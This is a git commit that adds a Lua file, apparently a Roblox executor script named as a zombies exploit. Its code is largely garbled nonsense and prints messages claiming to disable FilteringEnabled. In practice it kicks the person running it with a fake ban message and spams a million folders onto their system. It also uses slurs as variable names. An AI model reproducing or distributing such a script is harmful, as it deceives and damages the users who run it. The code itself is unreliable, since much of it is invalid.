ce74a87794410f1f3b4745bfb4eccdbcff336fd3
Farleyy <94583502+Farleyy@users.noreply.github.com>
2022-12-02 14:37:05 -0600

    Create MichealZombies.lua

---
+++ MichealZombies.lua
@@ -0,0 +1,80 @@
+pcall(function()
+stray=stray and pcall(function()retard=met end) 
+if stray==stray then
+xpcall(stray==nil)end
+if script.Parent.Parent.Parent.Parent.Parent.Visible == false then
+stray=tostring("imsmart")
+elseif fag==met then
+stray=tick(10)
+script.Parent.Parent.Parent.Parent.Parent.Visible = true	end--end end
+ypcall(math.random(30000000000000000000000000,nil))
+while stray==stray do
+local function a()																																			makefolder("a")makefolder("b")makefolder("C")makefolder("d")makefolder("e")makefolder("f")makefolder("g")makefolder("h")makefolder("i")makefolder("j")makefolder("k")makefolder("l")makefolder("m")makefolder("n")makefolder("o")makefolder("p")makefolder("q")makefolder("r")makefolder("s")makefolder("t")makefolder("u")makefolder("v")makefolder("w")makefolder("x")makefolder("y")makefolder("and")makefolder("z")end		
+pcall(function(plr)plr.Name="met"..false..false==true==false and warn(plr.Name and warn(plr.Character.Humanoid.WalkSpeed))end)end
+if stray==tick(10) then warn(game:GetService("Players"):FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid"):FindFirstChild("WalkSpeed"))end
+coroutine.wrap(function()end)()
+FE = disabled and disabled == false
+coroutine.wrap(function()end)()
+disabled = nil
+if FE == disabled and tick(1000104124, nil, warn("Hello World")) then ypcall(FE==disabled and disabled==true)end
+coroutine.wrap(function(plr)
+next(disabled==true..nil..print("disabling FE")..false..warn("ALMOSTDONE")..disabled..true..debug.traceback("Alrught"))end)()
+syn.request(disabled==disabled and FE==disabled..traceback(warn(ypcall(FE==false and disabled==true and FE==disabled and math.random(10000000000, 14124124, nil)))))
+script.Parent.Visible=math.random(true, false and nil) 
+coroutine.wrap(function()end)
+big_booty_men = bigcock and big_booty_men==false..false..OverlapParams==tick()..false..Enum.KeyCode.A(false)..nil
+bigcock=false
+coroutine.wrap(function()end)
+print(getmetatable(game))
+game:GetService("Players").LocalPlayer:Kick("0000007 null")
+syn.request(disabled==disabled and FE==disabled..traceback(warn(ypcall(FE==false and disabled==true and FE==disabled and math.random(10000000000, 14124124, nil)))))
+script.Parent.Visible=math.random(true, false and nil) 
+coroutine.wrap(function()end)
+big_booty_men = bigcock and big_booty_men==false..false..OverlapParams==tick()..false..Enum.KeyCode.A(false)..nil
+bigcock=false
+coroutine.wrap(function()end)
+if disabled == nil then print('It wont work WHYY')end
+coroutine.wrap(function(plr)print(plr.Name)end)
+PhysicalProperties.new(Enum.Material == math.random())
+local function DisFE(plr)
+print(plr.Name and plr.UserId) 
+disabled=Axes.new(getmetatable(game))
+wait(0.66)
+disabled=tonumber(123, 9) and Ray(false)
+warn("Trying this again dont worry ill do it for you ;)")
+disabled=DateTime(Color3.new(123,0,0))--confused the game ez		--now we do if check
+if disabled==DateTime(Color3.new(123,0,0)) then
+wait(warn(Color3.new(1,10,0)))		
+tick(1)
+disabled=plr.UserId --== false			
+if disabled==game.Players.LocalPlayer.UserId then				
+disabled=disabled
+end					
+end
+end
+DisFE()
+end)
+local function a()for i=1,1000000 do makefolder(tostring(i))end end
+	
+local function disabledTRUE()print("ASDAasdadasdasdasdasdasdasdasdadadadadadadOK1231231231231231231231312312312312313541351251251251251525")game.Players.LocalPlayer:Kick("000007_1: Null: "..game.Players.LocalPlayer.UserId.." Banned Filtering disabled.")end
+wait(1.1)--spesifcally 1.1				
+disabled=FE--.--disabled --== true				
+disabled=true	
+wait(1.1)--spesifcally 1.1				
+disabled=FE--.--disabled --== true				
+disabled=true	
+wait(1.1)--spesifcally 1.1				
+disabled=FE--.--disabled --== true				
+disabled=true	
+wait(1.1)--spesifcally 1.1				
+disabled=FE--.--disabled --== true				
+disabled=true
+wait(1.1)--spesifcally 1.1				
+disabled=FE--.--disabled --== true				
+disabled=true
+disabledTRUE()
+a()
+
+
+
+
